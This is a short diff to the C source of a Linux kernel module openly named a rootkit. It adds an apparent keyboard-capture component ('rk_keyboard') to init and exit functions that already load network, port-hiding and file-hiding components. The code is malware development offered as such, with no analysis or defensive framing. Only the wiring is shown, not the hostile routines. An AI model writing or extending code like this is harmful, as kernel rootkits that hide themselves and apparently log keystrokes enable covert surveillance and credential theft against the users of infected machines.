@@ -2,6 +2,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
+#include "rk_keyboard.h"
 #include "rk_net.h"
 #include "rk_hide_port.h"
 #include "rk_hide_file.h"
@@ -9,6 +10,7 @@
 MODULE_LICENSE("GPL");
 
 static int __init rootkit_init(void) {
+  rk_keyboard_init();
   rk_net_init();
   #ifdef HIDDEN
   rk_hide_port_init();
@@ -20,6 +22,7 @@ static int __init rootkit_init(void) {
 }
 
 static void __exit rootkit_exit(void) {
+  rk_keyboard_exit();
   rk_net_exit();
   #ifdef HIDDEN
   rk_hide_port_exit();
